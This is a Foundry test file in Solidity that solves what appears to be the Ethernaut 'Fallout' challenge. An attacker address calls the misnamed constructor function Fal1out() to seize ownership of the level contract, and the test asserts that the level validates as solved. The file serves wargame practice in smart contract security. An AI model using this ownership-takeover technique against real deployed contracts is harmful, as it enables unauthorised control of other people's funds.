// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

import "forge-std/Test.sol";
import "../src/levels/Fallout/Fallout.sol";
import "../src/levels/Fallout/FalloutFactory.sol";

contract FalloutTest is Test {
    FalloutFactory public factory;
    address payable public instance;
    address public player = address(0x01);
    address public attacker = address(0x02);

    function setUp() public {
        factory = new FalloutFactory();
        instance = payable(factory.createInstance(player));
    }

    function testFalloutAttack() public {
        vm.startPrank(attacker);
        Fallout(instance).Fal1out();
        vm.stopPrank();

        assertTrue(factory.validateInstance(instance, attacker));

        emit log_address(Fallout(instance).owner());
    }
}
